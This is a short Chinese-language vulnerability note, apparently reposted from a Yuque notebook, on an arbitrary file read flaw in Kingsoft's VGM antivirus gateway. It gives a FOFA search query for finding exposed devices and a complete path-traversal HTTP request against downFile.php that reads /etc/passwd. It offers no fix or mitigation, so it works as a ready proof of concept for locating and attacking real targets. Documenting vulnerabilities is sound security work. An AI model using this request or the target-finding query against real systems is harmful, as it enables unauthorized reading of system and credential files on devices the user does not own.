# 金山 VGM防毒墙downFile存在任意文件读取漏洞

# 一、漏洞简介
金山 VGM防毒墙由金山安全自主研发推出的新一代专业化安全网关产品。采用、多核硬件架构和独特的模块化功能设计理念，金山 VGM防毒墙具有的高性能、高安全、易操作等特性，真正满足用户不断变化的信息安全需求。灵活稳定的架构，金山 VGM防毒墙集成了网络防火墙、状态监测、抗DDoS、防恶意软件、URL过滤、DPI监测等多种安全功能，有效抵御各类病毒和恶意软件对用户网络和业务系统的破坏。金山 VGM防毒墙 downFile.php文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器任意文件。

# 二、影响版本
+ 金山 VGM防毒墙

# 三、资产测绘
+ fofa`"金山VGM"`
+ 特征

![1708142637307-ffd94189-f19f-4c4d-b4c2-eb650c58dd82.png](./img/3pBGTr3_-hUT2U1o/1708142637307-ffd94189-f19f-4c4d-b4c2-eb650c58dd82-317814.png)

# 四、漏洞复现
```java
GET /downFile.php?filename=../../../../etc/passwd HTTP/1.1
Host: 
Cookie: PHPSESSID=74hpcfh7p42bll8eabp1v88eq3
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: https://fofa.info/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```

![1708142781340-aa4c634a-95fc-4603-a0ed-f8afbeb0a85c.png](./img/3pBGTr3_-hUT2U1o/1708142781340-aa4c634a-95fc-4603-a0ed-f8afbeb0a85c-047081.png)



> 更新: 2024-02-29 23:57:11  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/rzhl67wobwkxypr0>